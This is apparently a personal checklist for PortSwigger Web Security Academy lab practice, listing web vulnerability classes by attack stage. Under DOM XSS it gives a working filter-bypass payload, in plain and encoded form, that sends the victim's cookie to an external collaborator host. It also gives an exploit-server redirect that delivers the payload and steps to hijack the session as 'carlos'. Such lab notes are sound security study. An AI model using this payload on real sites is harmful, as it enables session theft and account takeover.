1. Checked boxes means that the vulnerability has been checked and is not present.
2. make space below the checkboxes to add in screenshots for proof (only successful attempts?)
# SCANNING (Enumeration)
## Focus Scanning
- use *Scan selected insertion points* after selecting values 
	- add to the same task to not have too many tasks
		- be wary that it will queue up and may take longer
## Non-Standard Data Structures Scanning
- scan cleartext only if the value has a mix of cleartext and tokens/encoding
# STAGE 1: FOOTHOLD
- [x] Content Discovery?
	- `ffuz`, `robots.txt`
- [ ] [[Cross-Site Scripting (XSS)|XSS?]]
	- [ ] [[Cross-Site Scripting (XSS)#DOM-Based XSS|DOM XXS?]]
		- [ ] reflected DOM XSS : bypassing signature based filters
			- payload:
				`"-eval(atob('var i=new Image();i.src="http://h1jxn2m4xioxosa95g1bwm9dy44vsmia7.oastify.com/?cookie="+document.cookie;'))-"`
			- encoded payload:
				```
				%22-eval(atob('dmFyIGk9bmV3IEltYWdlKCk7IGkuc3JjPSJodHRwOi8vZ2N3emxvY3F2bWlrMzRxM3hpOW0xMGprN2JkMjF2cGsub2FzdGlmeS5jb20vP2Nvb2tpZT0iK2RvY3VtZW50LmNvb2tpZTs='))-%22
				```
			![[Screenshot 2024-06-18 at 4.21.08 PM.png]]
			- the following is received in *Collaborator*:
				![[Screenshot 2024-06-18 at 6.32.38 PM.png]]
			- use the following in the body of the exploit server and then deliver to victim, 
				```html 
				<script>
				document.location.href = "https://0a7e00db033481818283e7d8007000aa.web-security-academy.net/?SearchTerm=%22-eval(atob('dmFyIGk9bmV3IEltYWdlKCk7IGkuc3JjPSJodHRwOi8vZ2N3emxvY3F2bWlrMzRxM3hpOW0xMGprN2JkMjF2cGsub2FzdGlmeS5jb20vP2Nvb2tpZT0iK2RvY3VtZW50LmNvb2tpZTs='))-%22"
				</script>
				```
			- should receive their cookie
				![[Screenshot 2024-06-18 at 6.38.40 PM.png]]
			- open a blog post (has no csrf or any other parameters) and paste the cookie in *Repeater*. open the response in browser to log in as *carlos*:
				![[Screenshot 2024-06-18 at 6.42.22 PM.png]]
- [x] [[Web Cache Poisoning|Web Cache Poisoning?]]
- [x] [[HTTP Host Header Attacks|HTTP Host Header Attack?]]
- [x] [[HTTP Request Smuggling|Request Smuggling?]]
- [x] [[Authentication#Brute-Force Attacks|Brute-Force Authentication?]]
- [x] Others?
# STAGE 2: PRIVILEGE ESCALATION
- [x] [[Cross-Site Request Forgery (CSRF)|CSRF?]]
- [x] Password Reset
	- multiple different types, check all
- [ ] [[SQL Injection|SQLi?]]
	- advanced search page
	- ran `sqlmap` on the blog parameter with the following command:
		``
- [x] JWT?
- [x] [[Access Control|Access Control?]]
- [x] [[Cross-Origin Resource Sharing (CORS)]CORS?]

# STAGE 3: DATA EXFILTRATION
- [x] [[XML External Entity Injection (XXE)|XXE?]]
- [x] [[Server-Side Request Forgery (SSRF)|SSRF?]]
- [x] [[Server-Side Template Injection (SSTI)|SSTI?]]
- [x] [[Path Traversal|Path Traversal?]]
- [x] [[File Upload|File Upload?]]
- [ ] [[Insecure Deserialization|Insecure Deserialization?]]
- [x] [[OS Command Injection|Command Injection?]]
